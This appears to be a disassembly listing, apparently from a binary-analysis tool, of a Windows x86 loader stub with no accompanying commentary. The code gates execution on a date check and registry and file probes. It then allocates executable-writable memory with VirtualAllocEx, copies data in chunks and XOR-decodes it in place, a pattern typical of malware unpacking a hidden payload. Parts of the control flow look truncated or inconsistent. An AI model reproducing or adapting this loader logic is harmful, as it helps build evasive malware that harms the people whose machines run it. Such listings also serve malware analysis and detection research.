0x0041ad30:	pushl	%ebp	; from: 0x0041b176(MAY), 0x0041b28a(MAY)
0x0041ad31:	movl	%esp, %ebp
0x0041ad33:	subl	$0xc, %esp
0x0041ad36:	movl	$0x1e4dc, -8(%ebp)
0x0041ad3d:	movl	$0x3000, -12(%ebp)
0x0041ad44:	movl	$0x40, -4(%ebp)
0x0041ad4b:	movl	-4(%ebp), %eax
0x0041ad4e:	pushl	%eax
0x0041ad4f:	movl	-12(%ebp), %ecx
0x0041ad52:	pushl	%ecx
0x0041ad53:	movl	0x8(%ebp), %edx
0x0041ad56:	pushl	%edx
0x0041ad57:	pushl	$0x0
0x0041ad59:	pushl	$0xffffffff
0x0041ad5b:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff000260(MAY)
0x0041ad61:	movl	%ebp, %esp
0x0041ad63:	popl	%ebp
0x0041ad64:	ret	; targets: 0x0041b17b(MAY), 0x0041b28f(MAY)

0x0041ad70:	pushl	%ebp	; from: 0x0041b194(MAY)
0x0041ad71:	movl	%esp, %ebp
0x0041ad73:	popl	%ebp
0x0041ad74:	ret	; targets: 0x0041b199(MAY)

0x0041ad80:	pushl	%ebp	; from: 0x0041b1c8(MAY)
0x0041ad81:	movl	%esp, %ebp
0x0041ad83:	subl	$0x8, %esp
0x0041ad86:	movl	0x8(%ebp), %eax
0x0041ad89:	movl	%eax, -4(%ebp)
0x0041ad8c:	movl	0xc(%ebp), %ecx
0x0041ad8f:	movl	%ecx, -8(%ebp)
0x0041ad92:	movl	-4(%ebp), %edx
0x0041ad95:	cmpl	-8(%ebp), %edx
0x0041ad98:	jae	0x0041ada1	; targets: 0x0041ad9a(MAY), 0x0041ada1(MAY)
0x0041ad9a:	movl	-4(%ebp), %eax	; from: 0x0041ad98(MAY)
0x0041ad9d:	jmp	0x0041ada4	; targets: 0x0041ada4(MAY)
0x0041ada1:	movl	-8(%ebp), %eax	; from: 0x0041ad98(MAY)
0x0041ada4:	movl	%ebp, %esp	; from: 0x0041ad9d(MAY)
0x0041ada6:	popl	%ebp
0x0041ada7:	ret	; targets: 0x0041b1cd(MAY)

0x0041adb0:	pushl	%ebp	; from: 0x0041b08f(MAY)
0x0041adb1:	movl	%esp, %ebp
0x0041adb3:	movl	$0x401004, 0x0041ec68
0x0041adbd:	popl	%ebp
0x0041adbe:	ret	; targets: 0x0041b094(MAY)

0x0041adc0:	pushl	%ebp	; from: 0x0041b26a(MAY)
0x0041adc1:	movl	%esp, %ebp
0x0041adc3:	movl	$0x41a258, 0x0041ec68
0x0041adcd:	popl	%ebp
0x0041adce:	ret	; targets: 0x0041b26f(MAY)

0x0041add0:	pushl	%ebp	; from: 0x0041b275(MAY), 0x0041b161(MAY)
0x0041add1:	movl	%esp, %ebp
0x0041add3:	movl	0x8(%ebp), %eax
0x0041add6:	movl	-4(%eax), %eax
0x0041add9:	popl	%ebp
0x0041adda:	ret	; targets: 0x0041b166(MAY), 0x0041b27a(MAY)

0x0041ae60:	pushl	%ebp	; from: 0x0041b24e(MAY)
0x0041ae61:	movl	%esp, %ebp
0x0041ae63:	subl	$0x24, %esp
0x0041ae66:	movl	$0xdbc8, -8(%ebp)
0x0041ae6d:	movl	$0x0, -16(%ebp)
0x0041ae74:	jmp	0x0041ae7f	; targets: 0x0041ae7f(MAY)
0x0041ae7f:	movl	-16(%ebp), %ecx	; from: 0x0041ae74(MAY)
0x0041ae82:	cmpl	0xc(%ebp), %ecx
0x0041ae85:	jae	0x0041af51	; targets: 0x0041ae8b(MAY), 0x0041af51(MAY)
0x0041ae8b:	movl	$0xdbc8, -8(%ebp)	; from: 0x0041ae85(MAY)
0x0041ae92:	cmpl	$0x0, -16(%ebp)
0x0041ae96:	jne	0x0041aee8	; targets: 0x0041ae98(MAY)
0x0041ae98:	pushl	$0x104	; from: 0x0041ae96(MAY)
0x0041ae9d:	pushl	$0x41ec6c
0x0041aea2:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000280(MAY)
0x0041aea8:	pushl	$0x41c000
0x0041aead:	pushl	$0x41ec6c
0x0041aeb2:	call	lstrcatA@kernel32.dll	; targets: 0xff000110(MAY)
0x0041aeb8:	pushl	$0x0
0x0041aeba:	pushl	$0x80
0x0041aebf:	pushl	$0x3
0x0041aec1:	pushl	$0x0
0x0041aec3:	pushl	$0x3
0x0041aec5:	pushl	$0x1
0x0041aec7:	pushl	$0x41ec6c
0x0041aecc:	call	CreateFileA@kernel32.dll	; targets: 0xff000130(MAY)
0x0041aed2:	movl	%eax, -4(%ebp)
0x0041aed5:	cmpl	$0xffffffff, -4(%ebp)
0x0041aed9:	je	0x0041aee1	; targets: 0x0041aedb(MAY), 0x0041aee1(MAY)
0x0041aedb:	cmpl	$0x0, -4(%ebp)	; from: 0x0041aed9(MAY)
0x0041aedf:	jne	0x0041aee8	; targets: 0x0041aee1(MAY), 0x0041aee8(MAY)
0x0041aee1:	movl	$0x42, %eax	; from: 0x0041aedf(MAY), 0x0041aed9(MAY)
0x0041aee6:	jmp	0x0041af51	; targets: 0x0041af51(MAY)
0x0041aee8:	movl	$0xdbc8, -8(%ebp)	; from: 0x0041aedf(MAY)
0x0041aeef:	movl	-16(%ebp), %edx
0x0041aef2:	addl	$0x6296, %edx
0x0041aef8:	movl	%edx, 0x0041ed70
0x0041aefe:	movl	0x8(%ebp), %eax
0x0041af01:	addl	-16(%ebp), %eax
0x0041af04:	movl	(%eax), %ecx
0x0041af06:	addl	-16(%ebp), %ecx
0x0041af09:	movl	0x8(%ebp), %edx
0x0041af0c:	addl	-16(%ebp), %edx
0x0041af0f:	movl	%ecx, (%edx)
0x0041af11:	movl	-12(%ebp), %eax
0x0041af14:	movl	%eax, -20(%ebp)
0x0041af17:	movl	$0xdbc8, -8(%ebp)
0x0041af1e:	movl	0x0041ed70, %ecx
0x0041af24:	movl	%ecx, -36(%ebp)
0x0041af27:	movl	-36(%ebp), %edx
0x0041af2a:	movl	%edx, -32(%ebp)
0x0041af2d:	movl	-32(%ebp), %eax
0x0041af30:	movl	%eax, -28(%ebp)
0x0041af33:	movl	-28(%ebp), %ecx
0x0041af36:	movl	%ecx, -24(%ebp)
0x0041af39:	movl	0x8(%ebp), %edx
0x0041af3c:	addl	-16(%ebp), %edx
0x0041af3f:	movl	(%edx), %eax
0x0041af41:	xorl	-24(%ebp), %eax
0x0041af51:	movl	%ebp, %esp	; from: 0x0041aee6(MAY), 0x0041ae85(MAY)
0x0041af53:	popl	%ebp
0x0041af54:	ret	; targets: 0x0041b253(MAY)

0x0041afc0:	pushl	%ebp	; from: 0x0041b10f(MAY), 0x0041b068(MAY)
0x0041afc1:	movl	%esp, %ebp
0x0041afc3:	subl	$0x8, %esp
0x0041afc6:	movl	$0x41c018, -4(%ebp)
0x0041afcd:	leal	-8(%ebp), %eax
0x0041afd0:	pushl	%eax
0x0041afd1:	pushl	$0x20019
0x0041afd6:	pushl	$0x0
0x0041afd8:	pushl	$0x41ec60
0x0041afdd:	pushl	$0x80000002
0x0041afe2:	call	0x0041ed74	; targets: 0xff000330(MAY)
0x0041afe8:	testl	%eax, %eax
0x0041afea:	je	0x0041aff3	; targets: 0x0041afec(MAY), 0x0041aff3(MAY)
0x0041afec:	xorl	%eax, %eax	; from: 0x0041afea(MAY)
0x0041afee:	jmp	0x0041b094	; targets: 0x0041b094(MAY)
0x0041aff3:	leal	-8(%ebp), %ecx	; from: 0x0041afea(MAY)
0x0041aff6:	pushl	%ecx
0x0041aff7:	pushl	$0x20019
0x0041affc:	pushl	$0x0
0x0041affe:	pushl	$0x41ec64
0x0041b003:	pushl	$0x80000002
0x0041b008:	call	0x0041ed74	; targets: 0xff000330(MAY)
0x0041b00e:	testl	%eax, %eax
0x0041b010:	je	0x0041b016	; targets: 0x0041b016(MAY), 0x0041b012(MAY)
0x0041b012:	xorl	%eax, %eax	; from: 0x0041b010(MAY)
0x0041b014:	jmp	0x0041b094	; targets: 0x0041b094(MAY)
0x0041b016:	movl	$0x53, %edx	; from: 0x0041b010(MAY)
0x0041b01b:	movl	-4(%ebp), %eax
0x0041b01e:	movw	%dx, (%eax)
0x0041b021:	leal	-8(%ebp), %ecx
0x0041b024:	pushl	%ecx
0x0041b025:	pushl	$0x20019
0x0041b02a:	pushl	$0x0
0x0041b02c:	movl	-4(%ebp), %edx
0x0041b02f:	pushl	%edx
0x0041b030:	movl	-8(%ebp), %eax
0x0041b033:	pushl	%eax
0x0041b034:	call	0x0041ed74	; targets: 0xff000330(MAY)
0x0041b03a:	testl	%eax, %eax
0x0041b03c:	je	0x0041b042	; targets: 0x0041b042(MAY), 0x0041b03e(MAY)
0x0041b03e:	xorl	%eax, %eax	; from: 0x0041b03c(MAY)
0x0041b040:	jmp	0x0041b094	; targets: 0x0041b094(MAY)
0x0041b042:	leal	-8(%ebp), %ecx	; from: 0x0041b03c(MAY)
0x0041b045:	pushl	%ecx
0x0041b046:	pushl	$0x20019
0x0041b04b:	pushl	$0x0
0x0041b04d:	pushl	$0x41c030
0x0041b052:	movl	-8(%ebp), %edx
0x0041b055:	pushl	%edx
0x0041b056:	call	0x0041ed74	; targets: 0xff000330(MAY)
0x0041b05c:	testl	%eax, %eax
0x0041b05e:	je	0x0041b06d	; targets: 0x0041b06d(MAY), 0x0041b060(MAY)
0x0041b060:	pushl	$0x1	; from: 0x0041b05e(MAY)
0x0041b062:	pushl	$0x1
0x0041b064:	pushl	$0x1
0x0041b066:	pushl	$0x1
0x0041b068:	call	0x0041afc0	; targets: 0x0041afc0(MAY)
0x0041b06d:	leal	-8(%ebp), %eax	; from: 0x0041b05e(MAY), 0x0041b097(MAY)
0x0041b070:	pushl	%eax
0x0041b071:	pushl	$0x20019
0x0041b076:	pushl	$0x0
0x0041b078:	pushl	$0x41c0a8
0x0041b07d:	movl	-8(%ebp), %ecx
0x0041b080:	pushl	%ecx
0x0041b081:	call	0x0041ed74	; targets: 0xff000330(MAY)
0x0041b087:	testl	%eax, %eax
0x0041b089:	jne	0x0041b08f	; targets: 0x0041b08b(MAY), 0x0041b08f(MAY)
0x0041b08b:	xorl	%eax, %eax	; from: 0x0041b089(MAY)
0x0041b08d:	jmp	0x0041b094	; targets: 0x0041b094(MAY)
0x0041b08f:	call	0x0041adb0	; targets: 0x0041adb0(MAY)	; from: 0x0041b089(MAY)
0x0041b094:	movl	%ebp, %esp	; from: 0x0041b014(MAY), 0x0041b040(MAY), 0x0041afee(MAY), 0x0041b08d(MAY), 0x0041adbe(MAY)
0x0041b096:	popl	%ebp
0x0041b097:	ret	$0x10	; targets: 0x0041b06d(MAY), 0x0041b114(MAY)


start:
0x0041b0a0:	pushl	%ebp
0x0041b0a1:	movl	%esp, %ebp
0x0041b0a3:	subl	$0x4d4, %esp
0x0041b0a9:	pusha	
0x0041b0aa:	movl	%ebp, 0x0041ed78
0x0041b0b0:	movl	$0x0, -1184(%ebp)
0x0041b0ba:	movl	$0x80000002, -1204(%ebp)
0x0041b0c4:	movl	$0xe1d58000, -8(%ebp)
0x0041b0cb:	movl	$0x1a8e79f, -4(%ebp)
0x0041b0d2:	movl	RegOpenKeyExW@advapi32.dll, %eax
0x0041b0d7:	movl	%eax, 0x0041ed74
0x0041b0dc:	leal	-1208(%ebp), %ecx
0x0041b0e2:	pushl	%ecx
0x0041b0e3:	leal	-1212(%ebp), %edx
0x0041b0e9:	pushl	%edx
0x0041b0ea:	leal	-8(%ebp), %eax
0x0041b0ed:	pushl	%eax
0x0041b0ee:	call	FileTimeToDosDateTime@kernel32.dll	; targets: 0xff000150(MAY)
0x0041b0f4:	movzwl	-1212(%ebp), %ecx
0x0041b0fb:	cmpl	$0x21, %ecx
0x0041b0fe:	je	0x0041b107	; targets: 0x0041b107(MAY), 0x0041b100(MAY)
0x0041b100:	xorl	%eax, %eax	; from: 0x0041b0fe(MAY)
0x0041b102:	jmp	0x0041b3d5	; targets: 0x0041b3d5(MAY)
0x0041b107:	pushl	$0x1	; from: 0x0041b0fe(MAY)
0x0041b109:	pushl	$0x1
0x0041b10b:	pushl	$0x1
0x0041b10d:	pushl	$0x1
0x0041b10f:	call	0x0041afc0	; targets: 0x0041afc0(MAY)
0x0041b114:	movl	$0x0, -1060(%ebp)	; from: 0x0041b097(MAY)
0x0041b11e:	movl	$0x64, -1172(%ebp)
0x0041b128:	movl	$0x12, -1068(%ebp)
0x0041b132:	movl	$0x0, -1184(%ebp)
0x0041b13c:	movl	$0x0, -1124(%ebp)
0x0041b146:	movl	$0x1, -1168(%ebp)
0x0041b150:	movl	$0x3, -1064(%ebp)
0x0041b15a:	movl	0x0041ec68, %edx
0x0041b160:	pushl	%edx
0x0041b161:	call	0x0041add0	; targets: 0x0041add0(MAY)
0x0041b166:	addl	$0x4, %esp	; from: 0x0041adda(MAY)
0x0041b169:	movl	%eax, -1188(%ebp)
0x0041b16f:	movl	-1188(%ebp), %eax
0x0041b175:	pushl	%eax
0x0041b176:	call	0x0041ad30	; targets: 0x0041ad30(MAY)
0x0041b17b:	addl	$0x4, %esp	; from: 0x0041ad64(MAY)
0x0041b17e:	movl	%eax, -1180(%ebp)
0x0041b184:	movl	-1188(%ebp), %ecx
0x0041b18a:	pushl	%ecx
0x0041b18b:	pushl	$0x0
0x0041b18d:	movl	-1180(%ebp), %edx
0x0041b193:	pushl	%edx
0x0041b194:	call	0x0041ad70	; targets: 0x0041ad70(MAY)
0x0041b199:	addl	$0xc, %esp	; from: 0x0041ad74(MAY)
0x0041b19c:	movl	-1188(%ebp), %eax
0x0041b1a2:	movl	%eax, -1196(%ebp)
0x0041b1a8:	movl	-1184(%ebp), %ecx	; from: 0x0041b23b(MAY)
0x0041b1ae:	cmpl	-1188(%ebp), %ecx
0x0041b1b4:	jae	0x0041b240	; targets: 0x0041b240(MAY), 0x0041b1ba(MAY)
0x0041b1ba:	movl	-1196(%ebp), %edx	; from: 0x0041b1b4(MAY)
0x0041b1c0:	pushl	%edx
0x0041b1c1:	movl	-1172(%ebp), %eax
0x0041b1c7:	pushl	%eax
0x0041b1c8:	call	0x0041ad80	; targets: 0x0041ad80(MAY)
0x0041b1cd:	addl	$0x8, %esp	; from: 0x0041ada7(MAY)
0x0041b1d0:	movl	%eax, -1200(%ebp)
0x0041b1d6:	movl	-1200(%ebp), %ecx
0x0041b1dc:	pushl	%ecx
0x0041b1dd:	movl	0x0041ec68, %edx
0x0041b1e3:	addl	-1124(%ebp), %edx
0x0041b1e9:	pushl	%edx
0x0041b1ea:	movl	-1180(%ebp), %eax
0x0041b1f0:	addl	-1184(%ebp), %eax
0x0041b1f6:	pushl	%eax
0x0041b1f7:	call	0x0041b9bc	; targets: 0x0041b9bc(MAY)
0x0041b1fc:	addl	$0xc, %esp
0x0041b1ff:	movl	-1068(%ebp), %ecx
0x0041b205:	addl	-1172(%ebp), %ecx
0x0041b20b:	addl	-1124(%ebp), %ecx
0x0041b211:	movl	%ecx, -1124(%ebp)
0x0041b217:	movl	-1184(%ebp), %edx
0x0041b21d:	addl	-1172(%ebp), %edx
0x0041b223:	movl	%edx, -1184(%ebp)
0x0041b229:	movl	-1196(%ebp), %eax
0x0041b22f:	subl	-1200(%ebp), %eax
0x0041b235:	movl	%eax, -1196(%ebp)
0x0041b23b:	jmp	0x0041b1a8	; targets: 0x0041b1a8(MAY)
0x0041b240:	movl	-1188(%ebp), %ecx	; from: 0x0041b1b4(MAY)
0x0041b246:	pushl	%ecx
0x0041b247:	movl	-1180(%ebp), %edx
0x0041b24d:	pushl	%edx
0x0041b24e:	call	0x0041ae60	; targets: 0x0041ae60(MAY)
0x0041b253:	addl	$0x8, %esp	; from: 0x0041af54(MAY)
0x0041b256:	movl	$0x0, -1124(%ebp)
0x0041b260:	movl	$0x0, -1220(%ebp)
0x0041b26a:	call	0x0041adc0	; targets: 0x0041adc0(MAY)
0x0041b26f:	movl	0x0041ec68, %eax	; from: 0x0041adce(MAY)
0x0041b274:	pushl	%eax
0x0041b275:	call	0x0041add0	; targets: 0x0041add0(MAY)
0x0041b27a:	addl	$0x4, %esp	; from: 0x0041adda(MAY)
0x0041b27d:	movl	%eax, -1224(%ebp)
0x0041b283:	movl	-1224(%ebp), %ecx
0x0041b289:	pushl	%ecx
0x0041b28a:	call	0x0041ad30	; targets: 0x0041ad30(MAY)
0x0041b28f:	addl	$0x4, %esp	; from: 0x0041ad64(MAY)
0x0041b3d5:	movl	%ebp, %esp	; from: 0x0041b102(MAY)
0x0041b3d7:	popl	%ebp
0x0041b3d8:	ret	; targets: 0xfee70000(MAY)

0x0041b9bc:	jmp	memcpy@msvcrt.dll	; targets: 0xff000340(MAY)	; from: 0x0041b1f7(MAY)
